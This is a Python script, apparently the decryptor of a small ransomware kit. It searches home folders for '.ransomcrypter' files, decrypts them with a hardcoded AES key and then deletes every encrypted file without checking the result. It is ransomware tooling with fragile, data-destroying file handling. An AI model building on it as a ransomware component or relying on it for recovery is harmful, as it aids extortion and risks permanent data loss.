import os
import glob
import time
import pyaes
from sys import argv
from pathlib import Path
key = "102efd86a2bec382e7945002e53505a7"
filename_filter = ["*.ransomcrypter"]
base_path=Path.home() / "Downloads"
def revert(var):
    c=int(len(var)-1)
    msg=''
    for i in var:
        msg=msg+var[c]
        c=c-1
    return msg
def form(var):
    var=var.__str__()
    c=int(len(var)-1)
    o=r"\ ".replace(" ","")
    msg=''
    for g in var:
        if var[c]==o:
            break
        else:
            msg=msg+var[c]
        c=c-1
    msg=revert(msg)
    msg=var.replace(msg, "")
    return msg
def varer():
    pastas=[]
    for t in filename_filter:
        for filename in Path(base_path).rglob(t):
            pastas.append(form(filename))
    return pastas
lst_past=varer()
os.listdir(Path.home())
for o in os.listdir(Path.home()):
    lst_past.append(o)
def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):
            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)
            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file
            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')
for i in lst_past:
    try:
        desktop = Path.home() / i
    except Exception:
        pass
    try:
        os.chdir(desktop)
    except Exception:
        pass
    if __name__ == '__main__':
        if key == '102efd86a2bec382e7945002e53505a7':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida!!!')